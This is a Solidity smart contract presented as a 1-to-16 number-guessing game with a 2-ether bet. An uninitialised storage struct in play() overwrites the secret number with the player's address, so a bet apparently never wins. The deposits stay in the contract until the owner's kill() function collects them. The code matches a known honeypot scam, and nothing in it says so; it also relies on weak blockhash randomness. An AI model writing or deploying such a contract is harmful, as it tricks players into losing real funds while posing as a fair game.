pragma solidity ^0.4.23;

// CryptoRouletteAlpha
//
// Guess the number secretly stored in the blockchain and win the whole contract balance!
// A new number is randomly chosen after each try.
//
// To play, call the play() method with the guessed number (1-16).  Bet price: 2 ether

contract CryptoRouletteAlpha {

    uint256 private secretNumber;
    uint256 public lastPlayed;
    uint256 public betPrice = 2 ether;
    address public ownerAddr;

    struct Game {
        address player;
        uint256 number;
    }
    Game[] public gamesPlayed;

    constructor() public {
        ownerAddr = msg.sender;
        shuffle();
    }

    function shuffle() internal {
        // randomly set secretNumber with a value between 1 and 16
        secretNumber = uint8(sha3(now, block.blockhash(block.number-1))) % 16 + 1;
    }

    function play(uint256 number) payable public {
        // block calls from other contracts to prevent "revert transaction unless I won" attacks
        require(msg.sender == tx.origin);

        require(msg.value >= betPrice && number <= 16);

        Game game;
        game.player = msg.sender;
        game.number = number;
        gamesPlayed.push(game);

        if (number == secretNumber) {
            // win!
            msg.sender.transfer(this.balance);
        }

        shuffle();
        lastPlayed = now;
    }

    function kill() public {
        if (msg.sender == ownerAddr && now > lastPlayed + 6 hours) {
            suicide(msg.sender);
        }
    }

    function() public payable { }
}
